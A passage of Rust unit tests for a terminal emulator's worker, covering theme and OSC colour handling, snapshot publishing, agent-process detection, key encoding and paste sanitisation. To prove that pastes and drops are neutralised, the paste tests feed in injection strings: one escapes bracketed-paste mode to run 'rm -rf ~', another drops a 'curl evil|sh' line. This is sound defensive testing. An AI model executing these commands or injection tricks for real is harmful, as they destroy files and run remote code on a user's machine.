        assert_eq!(canonical_agent_title("π ⠋ project", None), "π ⠋ project");
    }

    #[test]
    fn changing_parser_theme_preserves_truecolor_and_osc_overrides_and_queries() {
        let mut terminal = Terminal::new(TerminalOptions {
            cols: 8,
            rows: 2,
            max_scrollback: 0,
        })
        .unwrap();
        let replies = Rc::new(RefCell::new(Vec::new()));
        terminal
            .on_pty_write({
                let replies = Rc::clone(&replies);
                move |_, bytes| replies.borrow_mut().extend_from_slice(bytes)
            })
            .unwrap();
        apply_theme(&mut terminal, TerminalTheme::Dark).unwrap();
        terminal.vt_write(b"\x1b[38;2;18;52;86mT\x1b[0mD\x1b[31mR\x1b[0m");
        let mut visual = VisualResources::new().unwrap();
        let dark = visual.capture(&terminal, 1, true, None).unwrap().unwrap();
        terminal.vt_write(b"\x1b]10;?\x07\x1b]11;?\x07\x1b]4;1;?\x07");
        let dark_queries = std::mem::take(&mut *replies.borrow_mut());
        apply_theme(&mut terminal, TerminalTheme::Light).unwrap();
        let light = visual.capture(&terminal, 2, true, None).unwrap().unwrap();
        assert_eq!(
            dark.lines[0].cells[0].foreground,
            light.lines[0].cells[0].foreground
        );
        assert_ne!(
            dark.lines[0].cells[1].foreground,
            light.lines[0].cells[1].foreground
        );
        assert_ne!(
            dark.lines[0].cells[2].foreground,
            light.lines[0].cells[2].foreground
        );
        terminal.vt_write(b"\x1b]10;?\x07\x1b]11;?\x07\x1b]4;1;?\x07");
        let light_queries = std::mem::take(&mut *replies.borrow_mut());
        assert!(!light_queries.is_empty());
        assert_ne!(dark_queries, light_queries);
        terminal.vt_write(b"\x1b]10;#123456\x07\x1b]11;#345678\x07\x1b]4;1;#56789a\x07");
        terminal.vt_write(b"\x1b]10;?\x07\x1b]11;?\x07\x1b]4;1;?\x07");
        let overridden = std::mem::take(&mut *replies.borrow_mut());
        apply_theme(&mut terminal, TerminalTheme::SolarizedDark).unwrap();
        terminal.vt_write(b"\x1b]10;?\x07\x1b]11;?\x07\x1b]4;1;?\x07");
        assert_eq!(*replies.borrow(), overridden);
        terminal.vt_write(b"\x1b]110\x07\x1b]111\x07\x1b]104;1\x07");
        assert_eq!(
            terminal.fg_color().unwrap(),
            terminal.default_fg_color().unwrap()
        );
        assert_eq!(
            terminal.bg_color().unwrap(),
            terminal.default_bg_color().unwrap()
        );
        assert_eq!(
            terminal.color_palette().unwrap().get(PaletteIndex::RED),
            terminal
                .default_color_palette()
                .unwrap()
                .get(PaletteIndex::RED)
        );
    }

    fn capture_worker() -> (Worker, Receiver<TerminalEvent>) {
        let recipe = LaunchRecipe {
            unset_environment: Default::default(),
            program: "/bin/true".into(),
            arguments: Vec::new(),
            working_directory: PathBuf::from("/"),
            environment: BTreeMap::new(),
        };
        capture_worker_for(recipe)
    }

    fn capture_worker_for(recipe: LaunchRecipe) -> (Worker, Receiver<TerminalEvent>) {
        capture_worker_with(recipe, TerminalConfig::default())
    }

    fn capture_worker_with(
        recipe: LaunchRecipe,
        config: TerminalConfig,
    ) -> (Worker, Receiver<TerminalEvent>) {
        let session = TerminalSession {
            owned_codex_listener: None,
            recovery_origin: None,
            id: crate::model::TerminalId::new(),
            launch: recipe.clone(),
            transcript_path: None,
            resume_hint: None,
            continuity: crate::model::TerminalContinuity::RelaunchAvailable {
                recipe,
                last_exit: None,
            },
        };
        let (_tx, commands) = command_channel(1);
        let (events, receiver) = crossbeam_channel::unbounded();
        let published = Arc::new(PublishedState::new(true, Arc::new(|_| {})));
        (
            Worker::start(session, config, commands, events, published).unwrap(),
            receiver,
        )
    }

    #[test]
    fn fresh_omp_activity_does_not_require_a_resumable_session() {
        use crate::agent::{Activity, ActivityState, Provider};
        use std::time::Instant;
        let directory = tempdir().unwrap();
        let executable = directory.path().join("omp");
        symlink("/bin/sleep", &executable).unwrap();
        let (mut worker, events) = capture_worker_for(LaunchRecipe {
            unset_environment: Default::default(),
            program: executable.to_str().unwrap().into(),
            arguments: vec!["10".into()],
            working_directory: directory.path().into(),
            environment: BTreeMap::from([
                ("HOME".into(), directory.path().to_str().unwrap().into()),
                (
                    "PI_CODING_AGENT_DIR".into(),
                    directory.path().to_str().unwrap().into(),
                ),
            ]),
        });
        let deadline = Instant::now() + Duration::from_secs(3);
        let process = loop {
            if let Some(process) = worker.observe_agent_process().cloned() {
                break process;
            }
            assert!(Instant::now() < deadline, "PTY foreground never became OMP");
            std::thread::sleep(Duration::from_millis(1));
        };
        let tty = std::fs::read_link(format!("/proc/{}/fd/0", process.pid)).unwrap();
        let markers = directory.path().join("terminal-sessions");
        std::fs::create_dir(&markers).unwrap();
        std::fs::write(
            markers.join(format!(
                "pts-{}",
                tty.file_name().unwrap().to_str().unwrap()
            )),
            format!(
                "{}\n{}\n",
                directory.path().display(),
                directory
                    .path()
                    .join("sessions/fresh_12345678-1234-1234-1234-123456789abc.jsonl")
                    .display()
            ),
        )
        .unwrap();
        worker.handle_command(Command::Hide);
        let generation = worker.generation;
        for title in ["π ⠋ fresh", "π ⠙ fresh", "π ! fresh", "π > fresh"] {
            worker.process_output(format!("\x1b]2;{title}\x07").into_bytes());
            assert!(
                worker
                    .resume_hint
                    .as_deref()
                    .and_then(crate::model::agent_recovery::recipe_from_hint)
                    .is_none(),
                "recognizing a fresh agent must not grant resume authority"
            );
        }
        let activity = events
            .try_iter()
            .filter_map(|event| match event {
                TerminalEvent::AgentActivityChanged(activity) => Some(activity),
                _ => None,
            })
            .collect::<Vec<_>>();
        assert_eq!(
            activity,
            [
                ActivityState::Unknown,
                ActivityState::Working,
                ActivityState::Waiting,
                ActivityState::Idle
            ]
            .map(|state| Some(Activity {
                provider: Provider::Omp,
                state
            }))
        );
        assert_eq!(
            worker.generation, generation,
            "hidden activity must not render"
        );
        worker.run();
    }

    #[test]
    fn activity_application_rejects_replaced_processes_and_expired_results() {
        use crate::agent::{Activity, ActivityState, Provider};
        use std::time::Instant;
        let directory = tempdir().unwrap();
        let executable = directory.path().join("claude");
        // A harmless native executable with recognizable argv; no provider I/O.
        symlink("/bin/sleep", &executable).unwrap();
        let (mut worker, _) = capture_worker_for(LaunchRecipe {
            unset_environment: Default::default(),
            program: executable.to_str().unwrap().into(),
            arguments: vec!["10".into()],
            working_directory: directory.path().into(),
            environment: BTreeMap::new(),
        });
        let startup_deadline = Instant::now() + Duration::from_secs(3);
        let process = loop {
            if let Some(process) = worker.observe_agent_process().cloned() {
                break process;
            }
            assert!(
                Instant::now() < startup_deadline,
                "PTY foreground never became Claude"
            );
            std::thread::sleep(Duration::from_millis(1));
        };
        let unknown = Some(Activity {
            provider: Provider::Claude,
            state: ActivityState::Unknown,
        });
        assert_eq!(
            *worker.published.agent_activity.lock().unwrap(),
            unknown,
            "a fresh foreground agent has identity before it reports activity"
        );
        let (reply, result) = crossbeam_channel::bounded(1);
        worker.handle_command(Command::ApplyAgentActivity {
            process: process.clone(),
            activity: None,
            title: None,
            reply,
            deadline: Instant::now() + Duration::from_secs(3),
        });
        assert_eq!(
            result.recv().unwrap(),
            unknown,
            "unavailable provider state must not erase a confirmed live identity"
        );
        let working = Some(Activity {
            provider: Provider::Claude,
            state: ActivityState::Working,
        });
        let apply = |worker: &mut Worker, process: AgentProcess, deadline| {
            let (reply, result) = crossbeam_channel::bounded(1);
            worker.handle_command(Command::ApplyAgentActivity {
                process,
                activity: working,
                title: None,
                reply,
                deadline,
            });
            result.recv().unwrap()
        };
        let deadline = || std::time::Instant::now() + Duration::from_secs(3);
        assert_eq!(apply(&mut worker, process.clone(), deadline()), working);
        let mut replaced = process.clone();
        replaced.start = replaced.start.wrapping_add(1);
        assert_eq!(apply(&mut worker, replaced, deadline()), None);
        assert_eq!(
            *worker
                .published
                .agent_activity
                .lock()
                .unwrap_or_else(|error| error.into_inner()),
            None
        );
        assert_eq!(apply(&mut worker, process.clone(), deadline()), working);
        let mut other_process = process.clone();
        other_process.pid += 1;
        assert_eq!(apply(&mut worker, other_process, deadline()), None);
        assert_eq!(apply(&mut worker, process.clone(), deadline()), working);
        assert_eq!(
            apply(&mut worker, process.clone(), std::time::Instant::now()),
            None
        );
        worker.adopt_agent_process(Some(process));
        worker.set_agent_activity(working);
        worker.adopt_agent_process(None);
        assert_eq!(
            *worker.published.agent_activity.lock().unwrap(),
            None,
            "a shell cannot retain the previous agent identity"
        );
        // The disconnected command channel drives normal kill/reap teardown.
        worker.run();
    }

    #[test]
    fn capture_credit_coalesces_batches_and_preserves_semantic_events() {
        let (mut worker, events) = capture_worker();
        worker.publish_snapshot(true);
        let first = worker.generation;
        worker.process_output(b"old".to_vec());
        worker.process_output(b"\r\x1b[2Klatest\x07\x1b]2;title\x07".to_vec());
        assert_eq!(worker.generation, first);
        assert_eq!(
            worker
                .published
                .activity
                .lock()
                .unwrap_or_else(|error| error.into_inner())
                .unwrap()
                .sequence,
            2
        );
        assert_eq!(
            events.try_iter().collect::<Vec<_>>(),
            vec![
                TerminalEvent::Bell,
                TerminalEvent::TitleChanged("title".into())
            ]
        );
        worker.published.acknowledge(first);
        worker.capture_if_ready();
        let snapshot = worker.published.snapshot.load_full();
        assert_eq!(
            snapshot.lines[0]
                .cells
                .iter()
                .take(6)
                .map(|cell| cell.text.as_str())
                .collect::<String>(),
            "latest"
        );
        assert_eq!(snapshot.activity.unwrap().sequence, 2);
        // Returning old credit cannot buy an extra snapshot.
        worker.process_output(b"!".to_vec());
        worker.published.acknowledge(first);
        worker.capture_if_ready();
        assert_eq!(worker.generation, first + 1);
        worker.published.acknowledge(first + 1);
        worker.capture_if_ready();
        assert_eq!(worker.published.snapshot.load().lines[0].cells[6].text, "!");
        // An ACK arriving before the next output also cannot strand that output.
        worker.published.acknowledge(worker.generation);
        worker.process_output(b"?".to_vec());
        assert_eq!(worker.published.snapshot.load().lines[0].cells[7].text, "?");
        worker.published.acknowledge(worker.generation);
        let previous = worker.published.snapshot.load_full();
        worker.process_output(b"\x1b[31m".to_vec());
        let activity_only = worker.published.snapshot.load_full();
        assert_eq!(activity_only.lines, previous.lines);
        assert!(activity_only.activity.unwrap().sequence > previous.activity.unwrap().sequence);
        worker.run();
    }

    #[test]
    fn eof_preserves_final_grid_without_outstanding_consumer_credit() {
        let (mut worker, _) = capture_worker();
        worker.publish_snapshot(true);
        worker.process_output(b"final".to_vec());
        let published = Arc::clone(&worker.published);
        // Keep the command channel connected so child EOF, not client teardown,
        // ends the worker loop.
        let (_commands, receiver) = command_channel(1);
        worker.commands = receiver;
        worker.run();
        assert_eq!(
            published.snapshot.load().lines[0]
                .cells
                .iter()
                .take(5)
                .map(|cell| cell.text.as_str())
                .collect::<String>(),
            "final"
        );
    }

    #[test]
    fn hidden_eof_preserves_final_contents_without_visual_wakes() {
        let (mut worker, _) = capture_worker();
        worker.set_hidden();
        worker.process_output(b"hidden".to_vec());
        assert_eq!(worker.generation, 0);
        let published = Arc::clone(&worker.published);
        let (_commands, receiver) = command_channel(1);
        worker.commands = receiver;
        worker.run();
        assert_eq!(published.announced_generation.load(Ordering::Acquire), 0);
        assert_eq!(
            published.snapshot.load().lines[0]
                .cells
                .iter()
                .take(6)
                .map(|cell| cell.text.as_str())
                .collect::<String>(),
            "hidden"
        );
    }

    #[test]
    fn agent_process_edges_wake_even_when_the_activity_scalar_is_unchanged() {
        let (mut worker, events) = capture_worker();
        let wakes = Arc::new(AtomicUsize::new(0));
        let observed = Arc::clone(&wakes);
        assert!(
            worker
                .published
                .agent_observer
                .set(Arc::new(move || {
                    observed.fetch_add(1, Ordering::AcqRel);
                }))
                .is_ok()
        );
        let mut process = AgentProcess {
            pid: 1,
            start: 2,
            provider: crate::agent::Provider::Claude,
            launch: worker.launch.clone(),
            recovery: worker.launch.clone(),
        };
        worker.adopt_agent_process(Some(process.clone()));
        worker.adopt_agent_process(Some(process.clone()));
        assert_eq!(wakes.load(Ordering::Acquire), 1);
        process.start += 1;
        worker.adopt_agent_process(Some(process.clone()));
        assert_eq!(wakes.load(Ordering::Acquire), 2);
        assert_eq!(
            *worker.published.agent_process.lock().unwrap(),
            Some(process)
        );
        assert_eq!(
            events
                .try_iter()
                .filter(|event| matches!(event, TerminalEvent::AgentActivityChanged(_)))
                .count(),
            1,
            "replacing Unknown with Unknown wakes discovery, not subscribers"
        );
        worker.published.set_agent_activity(None);
        worker.published.set_agent_activity(None);
        assert_eq!(
            events
                .try_iter()
                .filter(|event| matches!(event, TerminalEvent::AgentActivityChanged(None)))
                .count(),
            1,
            "owner timeout clears are pushed exactly once"
        );
        worker.set_conversation_title("Same conversation".into());
        worker.set_conversation_title("Same conversation".into());
        assert_eq!(
            events
                .try_iter()
                .filter(|event| matches!(event, TerminalEvent::ConversationTitleChanged(_)))
                .count(),
            1
        );
        worker.adopt_agent_process(None);
        assert_eq!(wakes.load(Ordering::Acquire), 3);
        assert!(worker.published.agent_process.lock().unwrap().is_none());
        worker.run();
    }

    #[test]
    fn foreground_sampling_discovers_shell_exec_without_a_process_group_change() {
        let directory = tempdir().unwrap();
        let executable = directory.path().join("claude");
        symlink("/bin/sleep", &executable).unwrap();
        let (mut worker, _) = capture_worker_for(LaunchRecipe {
            unset_environment: Default::default(),
            program: "/bin/sh".into(),
            arguments: vec!["-c".into(), "read line; exec \"$AGENT\" 10".into()],
            working_directory: directory.path().into(),
            environment: BTreeMap::from([("AGENT".into(), executable.to_str().unwrap().into())]),
        });
        worker.observe_foreground();
        let original_group = worker.foreground_group();
        assert!(original_group.is_some());
        assert!(worker.agent_process.is_none());
        worker.write_pty(b"start\n", "fixture input");
        let deadline = std::time::Instant::now() + Duration::from_secs(3);
        while worker.agent_process.is_none() {
            worker.observe_foreground();
            assert!(
                std::time::Instant::now() < deadline,
                "unchanged foreground group hid shell exec"
            );
            std::thread::sleep(Duration::from_millis(5));
        }
        assert_eq!(worker.foreground_group(), original_group);
        assert_eq!(
            worker.agent_process.as_ref().unwrap().provider,
            crate::agent::Provider::Claude
        );
        assert!(worker.published.agent_process.lock().unwrap().is_some());
        worker.run();
    }

    #[test]
    fn foreground_observation_backs_off_and_slows_for_unwatched_terminals() {
        // A long-lived child keeps the foreground group stable for the whole
        // test, so every tick below takes its "nothing changed" path.
        let (mut worker, _) = capture_worker_for(LaunchRecipe {
            unset_environment: Default::default(),
            program: "/bin/sleep".into(),
            arguments: vec!["10".into()],
            working_directory: PathBuf::from("/"),
            environment: BTreeMap::new(),
        });
        worker.resume_foreground = worker.foreground_group();
        assert!(worker.agent_process.is_none());

        // With the same group and no agent to track, the interval stretches instead of descending /proc every 2s forever.
        worker.observe_foreground();
        assert_eq!(worker.foreground_poll, FOREGROUND_POLL_MIN * 2);
        worker.observe_foreground();
        assert_eq!(worker.foreground_poll, FOREGROUND_POLL_MIN * 4);
        assert_eq!(worker.resume_foreground, worker.foreground_group());

        // A terminal nobody is watching still re-walks a tracked agent, at the
        // slowest interval, so its saved identity stays current for recovery
        // even though the agent never leaves the foreground.
        worker.set_hidden();
        let launch = worker.launch.clone();
        worker.agent_process = Some(crate::model::agent_recovery::AgentProcess {
            pid: 1,
            start: 0,
            provider: crate::agent::Provider::Claude,
            launch: launch.clone(),
            recovery: launch,
        });
        worker.observe_foreground();
        assert!(
            worker.agent_process.is_none(),
            "the tracked agent was re-observed"
        );
        assert_eq!(worker.resume_foreground, worker.foreground_group());
        assert_eq!(worker.foreground_poll, FOREGROUND_POLL_MAX);

        // Revealing it makes the next observation prompt again.
        worker.reveal();
        assert_eq!(worker.foreground_poll, FOREGROUND_POLL_MIN);
    }

    #[test]
    fn shutdown_preserves_already_parsed_dirty_contents() {
        let (mut worker, _) = capture_worker();
        worker.publish_snapshot(true);
        worker.process_output(b"before shutdown".to_vec());
        let published = Arc::clone(&worker.published);
        let (commands, receiver) = command_channel(1);
        commands.send(Command::Shutdown).unwrap();
        worker.commands = receiver;
        worker.run();
        assert_eq!(
            published.snapshot.load().lines[0]
                .cells
                .iter()
                .take(15)
                .map(|cell| cell.text.as_str())
                .collect::<String>(),
            "before shutdown"
        );
    }

    #[test]
    fn leader_exit_does_not_end_output_capture_or_redraw_credit() {
        let (mut worker, events) = capture_worker();
        worker.publish_snapshot(true);
        let mut exited = false;
        worker.handle_child_exit(&mut exited, Ok(ExitStatus::with_exit_code(0)));
        assert!(matches!(
            events.try_recv(),
            Ok(TerminalEvent::Exited { .. })
        ));
        worker.process_output(b"descendant".to_vec());
        worker.published.acknowledge(worker.generation);
        worker.capture_if_ready();
        assert_eq!(
            worker.published.snapshot.load().lines[0]
                .cells
                .iter()
                .take(10)
                .map(|cell| cell.text.as_str())
                .collect::<String>(),
            "descendant"
        );
        assert!(
            events
                .try_iter()
                .all(|event| !matches!(event, TerminalEvent::Completed { .. })),
            "root exit must not finalize a PTY still owned by descendants"
        );
        worker.run();
        assert!(
            events
                .try_iter()
                .any(|event| matches!(event, TerminalEvent::Completed { .. })),
            "worker teardown publishes the distinct final completion event"
        );
    }

    fn test_published(visible: bool, wakes: Arc<AtomicUsize>) -> PublishedState {
        PublishedState::new(
            visible,
            Arc::new(move |_| {
                wakes.fetch_add(1, Ordering::SeqCst);
            }),
        )
    }

    fn snapshot(generation: u64) -> Arc<RenderSnapshot> {
        Arc::new(RenderSnapshot {
            generation,
            ..RenderSnapshot::empty()
        })
    }

    fn key_input(
        action: KeyAction,
        key: TerminalKey,
        text: Option<&str>,
        unshifted_codepoint: Option<char>,
    ) -> KeyInput {
        KeyInput {
            action,
            key,
            modifiers: KeyModifiers::default(),
            text: text.map(str::to_owned),
            unshifted_codepoint,
        }
    }

    #[test]
    fn a_paste_is_typed_input_until_the_child_asks_for_brackets() {
        let mut terminal = Terminal::new(TerminalOptions {
            cols: 80,
            rows: 24,
            max_scrollback: 100,
        })
        .unwrap();
        assert_eq!(
            encode_paste(&terminal, "one\r\ntwo\nthree\rfour", PasteOrigin::Clipboard).unwrap(),
            b"one\rtwo\rthree\rfour"
        );
        assert_eq!(
            encode_paste(&terminal, "", PasteOrigin::Clipboard).unwrap(),
            b""
        );

        terminal.vt_write(b"\x1b[?2004h");
        assert_eq!(
            encode_paste(&terminal, "one\ntwo", PasteOrigin::Clipboard).unwrap(),
            b"\x1b[200~one\ntwo\x1b[201~"
        );
        // An empty paste is no paste, not an empty pair of brackets a child
        // would take for one.
        assert_eq!(
            encode_paste(&terminal, "", PasteOrigin::Clipboard).unwrap(),
            b""
        );

        terminal.vt_write(b"\x1b[?2004l");
        assert_eq!(
            encode_paste(&terminal, "a\nb", PasteOrigin::Clipboard).unwrap(),
            b"a\rb"
        );
    }

    /// The mode is read where the child's output is parsed, so a paste that
    /// follows the child enabling bracketed paste is framed, however recently
    /// it asked.
    #[test]
    fn a_paste_reaches_the_child_framed_once_it_asks_for_brackets() {
        let recipe = LaunchRecipe {
            unset_environment: Default::default(),
            program: "/bin/sh".into(),
            arguments: vec![
                "-c".into(),
                "printf '\\033[?2004h\\033]2;ready\\007'; IFS= read -r line; \
                 printf '\\033]2;got:%s\\007' \"$(printf %s \"$line\" | od -An -tx1 | tr -d ' \\n')\"; \
                 sleep 5"
                    .into(),
            ],
            working_directory: PathBuf::from("/"),
            environment: BTreeMap::new(),
        };
        let terminal = TerminalHandle::spawn(
            TerminalSession {
                owned_codex_listener: None,
                recovery_origin: None,
                id: crate::model::TerminalId::new(),
                launch: recipe.clone(),
                transcript_path: None,
                resume_hint: None,
                continuity: crate::model::TerminalContinuity::RelaunchAvailable {
                    recipe,
                    last_exit: None,
                },
            },
            TerminalConfig::default(),
            |_| {},
        )
        .unwrap();
        let events = terminal.events();
        let title = |prefix: &str| {
            let deadline = std::time::Instant::now() + Duration::from_secs(10);
            loop {
                match events
                    .recv_timeout(deadline.saturating_duration_since(std::time::Instant::now()))
                    .unwrap()
                {
                    TerminalEvent::TitleChanged(title) if title.starts_with(prefix) => {
                        break title;
                    }
                    _ => {}
                }
            }
        };
        title("ready");
        terminal.paste("a b\n", PasteOrigin::Clipboard).unwrap();
        // The line the child read ends at the paste's own newline, which the
        // brackets kept from becoming a carriage return: ESC [ 2 0 0 ~ a SP b.
        assert_eq!(title("got:"), "got:1b5b3230307e612062");
        terminal.shutdown().unwrap();
    }

    #[test]
    fn a_paste_cannot_end_its_own_brackets_or_signal_the_child() {
        let mut terminal = Terminal::new(TerminalOptions {
            cols: 80,
            rows: 24,
            max_scrollback: 100,
        })
        .unwrap();
        terminal.vt_write(b"\x1b[?2004h");
        assert_eq!(
            encode_paste(&terminal, "a\x1b[201~rm -rf ~\n", PasteOrigin::Clipboard).unwrap(),
            b"\x1b[200~a [201~rm -rf ~\n\x1b[201~"
        );
        assert_eq!(
            encode_paste(&terminal, "\0\x03\x04\x1a\x7f", PasteOrigin::Clipboard).unwrap(),
            b"\x1b[200~     \x1b[201~"
        );

        terminal.vt_write(b"\x1b[?2004l");
        assert_eq!(
            encode_paste(&terminal, "a\x1b[Ab\x03", PasteOrigin::Clipboard).unwrap(),
            b"a [Ab "
        );
    }

    /// Dragged text is the drag source's to choose, so it must not be able to
    /// run a command in a child that reads a paste as typed input.
    #[test]
    fn a_drop_never_enters_a_line_or_presses_a_key() {
        let mut terminal = Terminal::new(TerminalOptions {
            cols: 80,
            rows: 24,
            max_scrollback: 100,
        })
        .unwrap();
        // Line breaks, readline's previous-history, kill and line-start keys,
        // a C1 CSI and DEL all arrive as spaces; TAB is text.
        assert_eq!(
            encode_paste(
                &terminal,
                "curl evil|sh\n\x10\r\x0b\x01x\r\n\u{9b}\x7f\ty",
                PasteOrigin::Drop
            )
            .unwrap(),
            b"curl evil|sh     x    \ty"
        );
        // A clipboard paste into the same child still enters its lines.
        assert_eq!(
            encode_paste(&terminal, "ls\n", PasteOrigin::Clipboard).unwrap(),
            b"ls\r"
        );

        // A child in bracketed paste mode reads the drop as one paste, which
        // it never runs by itself, so its line breaks are kept for it.
        terminal.vt_write(b"\x1b[?2004h");
        assert_eq!(
            encode_paste(&terminal, "a\nb\x1b[201~\n", PasteOrigin::Drop).unwrap(),
            b"\x1b[200~a\nb [201~\n\x1b[201~"
        );
    }

    #[test]
    fn control_c_interrupts_whatever_keyboard_protocol_the_shell_left_behind() {
        let mut terminal = Terminal::new(TerminalOptions {
            cols: 80,
            rows: 24,
            max_scrollback: 100,
        })
        .unwrap();
        let mut encoder = KeyEncoder::new().unwrap();
        let mut control_c = |terminal: &Terminal<'_, '_>, text: &str| {
            let mut input = key_input(
                KeyAction::Press,
                TerminalKey::Character('c'),
                Some(text),
                Some('c'),
            );
            input.modifiers.control = true;
            encode_key_input(terminal, &mut encoder, input).unwrap()
        };

        // A child that never asked for the kitty protocol reads ETX, which the
        // line discipline turns into SIGINT.
        assert_eq!(control_c(&terminal, "c"), b"\x03");
        // fish pushes the protocol at its prompt...
        terminal.vt_write(b"\x1b[>5u");
        assert_eq!(control_c(&terminal, "c"), b"\x1b[99;5u");
        // ...and pops it before running a command, which reads ETX again.
        terminal.vt_write(b"\x1b[<u");
        assert_eq!(control_c(&terminal, "c"), b"\x03");
        // Handed the ETX itself as the key's text, the encoder has no key to
        // name and never produces one, which is why the widget hands over
        // what the key types without Ctrl.
        assert_eq!(control_c(&terminal, "\u{3}"), b"\x1b[3;5u");

        // The other control characters come from the key's own text as well,
        // and a chord with no control character of its own is named instead.
        let control = KeyModifiers {
            control: true,
            ..KeyModifiers::default()
        };
        for (key, text, unshifted, modifiers, expected) in [
            (' ', " ", ' ', control, &b"\x00"[..]),
            ('2', "2", '2', control, b"\x00"),
            ('/', "/", '/', control, b"\x1f"),
            (
                'c',
                "c",
                'c',
                KeyModifiers {
                    alt: true,
                    ..control
                },
                b"\x1b\x03",
            ),
            (
                'a',
                "A",
                'a',
                KeyModifiers {
                    shift: true,
                    ..control
                },
                b"\x1b[97;6u",
            ),
            ('[', "[", '[', control, b"\x1b[91;5u"),
        ] {
            let mut input = key_input(
                KeyAction::Press,
                TerminalKey::Character(key),
                Some(text),
                Some(unshifted),
            );
            input.modifiers = modifiers;
            assert_eq!(
                encode_key_input(&terminal, &mut encoder, input).unwrap(),
                expected,
                "{modifiers:?} {text:?}"
            );
        }

        // Keys that type control characters even without Ctrl are encoded
        // from the key alone.
        for (key, expected) in [
            (TerminalKey::Enter, &b"\r"[..]),
            (TerminalKey::Tab, b"\t"),
            (TerminalKey::Escape, b"\x1b"),
        ] {
            let input = key_input(KeyAction::Press, key, None, None);
            assert_eq!(
                encode_key_input(&terminal, &mut encoder, input).unwrap(),
                expected,
                "{key:?}"
            );
        }
    }

    #[test]
    fn control_c_interrupts_on_a_non_latin_layout() {
        let mut terminal = Terminal::new(TerminalOptions {
            cols: 80,
            rows: 24,
            max_scrollback: 100,
        })
        .unwrap();
        let mut encoder = KeyEncoder::new().unwrap();
        // Ctrl+С on a Russian layout: the widget names the Latin key in its
        // place and hands over the layout's own text.
        let mut control = |terminal: &Terminal<'_, '_>, key, typed: &str| {
            let mut input = key_input(
                KeyAction::Press,
                TerminalKey::Character(key),
                Some(typed),
                typed.chars().next(),
            );
            input.modifiers.control = true;
            encode_key_input(terminal, &mut encoder, input).unwrap()
        };
        assert_eq!(control(&terminal, 'c', "с"), b"\x03");
        // The punctuation keys follow the US key in their place, into whatever
        // Ghostty makes of that key: Ctrl+Ъ is Ctrl+], and Ctrl+Х is Ctrl+[,
        // which Ghostty keeps as CSI u after fixterms rather than a bare ESC.
        assert_eq!(control(&terminal, ']', "ъ"), b"\x1d");
        assert_eq!(control(&terminal, '[', "х"), "\x1b[1093;5u".as_bytes());
        // A kitty child reads the layout's key, and its base-layout key when
        // it asks for alternates.
        terminal.vt_write(b"\x1b[>1u");
        assert_eq!(control(&terminal, 'c', "с"), "\x1b[1089;5u".as_bytes());
        terminal.vt_write(b"\x1b[=5u");
        assert_eq!(control(&terminal, 'c', "с"), "\x1b[1089::99;5u".as_bytes());
    }

    #[test]
    fn control_backspace_kills_words_only_in_legacy_encoding() {
        let mut terminal = Terminal::new(TerminalOptions {
            cols: 80,
            rows: 24,
            max_scrollback: 100,
        })
        .unwrap();
        let mut encoder = KeyEncoder::new().unwrap();
        for action in [KeyAction::Press, KeyAction::Repeat, KeyAction::Release] {
            let mut input = key_input(action, TerminalKey::Backspace, None, None);
            input.modifiers.control = true;
            let bytes = encode_key_input(&terminal, &mut encoder, input).unwrap();
            assert_eq!(
                bytes,
                if action == KeyAction::Release {
                    &b""[..]
                } else {
                    &b"\x17"[..]
                }
            );
        }
        terminal.vt_write(b"\x1b[>1u");
        let mut input = key_input(KeyAction::Press, TerminalKey::Backspace, None, None);
        input.modifiers.control = true;
        assert_eq!(
            encode_key_input(&terminal, &mut encoder, input).unwrap(),
            b"\x1b[127;5u"
        );
    }

    #[test]
    fn legacy_repeats_encode_once_as_ordinary_key_presses() {
        let terminal = Terminal::new(TerminalOptions {
            cols: 80,
            rows: 24,
            max_scrollback: 1_000,
        })
        .unwrap();
        let mut encoder = KeyEncoder::new().unwrap();
        let cases = [
            (TerminalKey::ArrowDown, None, None, &b"\x1b[B"[..]),
            (TerminalKey::Character('x'), Some("x"), Some('x'), &b"x"[..]),
            (TerminalKey::Backspace, None, None, &b"\x7f"[..]),
        ];

        for (key, text, unshifted_codepoint, expected) in cases {
            let press = encode_key_input(
                &terminal,
                &mut encoder,
                key_input(KeyAction::Press, key, text, unshifted_codepoint),
            )
            .unwrap();
            let repeat = encode_key_input(
                &terminal,
                &mut encoder,
                key_input(KeyAction::Repeat, key, text, unshifted_codepoint),
            )
            .unwrap();

            assert_eq!(press, expected, "unexpected press encoding for {key:?}");
            assert_eq!(repeat, expected, "unexpected repeat encoding for {key:?}");
        }
    }

    #[test]
    fn event_reporting_protocol_preserves_repeat_semantics() {
        let mut terminal = Terminal::new(TerminalOptions {
            cols: 80,
            rows: 24,
            max_scrollback: 1_000,
        })
        .unwrap();
        terminal.vt_write(b"\x1b[>2u");
        assert!(
            terminal
                .kitty_keyboard_flags()
                .unwrap()
                .contains(key::KittyKeyFlags::REPORT_EVENTS)
        );
        let mut encoder = KeyEncoder::new().unwrap();

        let press = encode_key_input(
            &terminal,
            &mut encoder,
            key_input(KeyAction::Press, TerminalKey::ArrowDown, None, None),
        )
        .unwrap();
        let repeat = encode_key_input(
            &terminal,
            &mut encoder,
            key_input(KeyAction::Repeat, TerminalKey::ArrowDown, None, None),
        )
        .unwrap();

        assert_eq!(press, b"\x1b[1;1:1B");
        assert_eq!(repeat, b"\x1b[1;1:2B");
    }

    /// A generation the subscriber has not acknowledged must not silence the
    /// next one. `capture_if_ready` is what holds this protocol to one wake
    /// per drawn frame, so the announcement itself must not also wait for a
    /// draw: an edge the callback dropped - a repaint broadcast while no
    /// subscriber was visible - would otherwise freeze the terminal until
    /// something unrelated repainted it.
    #[test]
    fn each_published_generation_is_announced_once_without_an_acknowledgement() {
        let wakes = Arc::new(AtomicUsize::new(0));
        let published = test_published(true, Arc::clone(&wakes));

        published.publish(snapshot(1));
        published.publish(snapshot(2));
        assert_eq!(wakes.load(Ordering::SeqCst), 2);

        // Acknowledging returns capture credit and announces nothing.
        published.acknowledge(2);
        assert_eq!(wakes.load(Ordering::SeqCst), 2);
        assert_eq!(published.capture_rx.try_recv(), Ok(()));
    }

    #[test]
    fn hidden_publication_suppresses_visual_wakes() {
        let wakes = Arc::new(AtomicUsize::new(0));
        let published = test_published(false, Arc::clone(&wakes));

        published.publish(snapshot(1));

        assert_eq!(published.snapshot.load().generation, 1);
        assert_eq!(wakes.load(Ordering::SeqCst), 0);
    }

    #[test]
    fn visibility_reveal_emits_latest_snapshot_once() {
        let wakes = Arc::new(AtomicUsize::new(0));
        let published = test_published(false, Arc::clone(&wakes));
        published.publish(snapshot(4));

        published.visible.store(true, Ordering::Release);
        published.request_wake(4);
        published.request_wake(4);

        assert_eq!(wakes.load(Ordering::SeqCst), 1);
    }

    #[test]
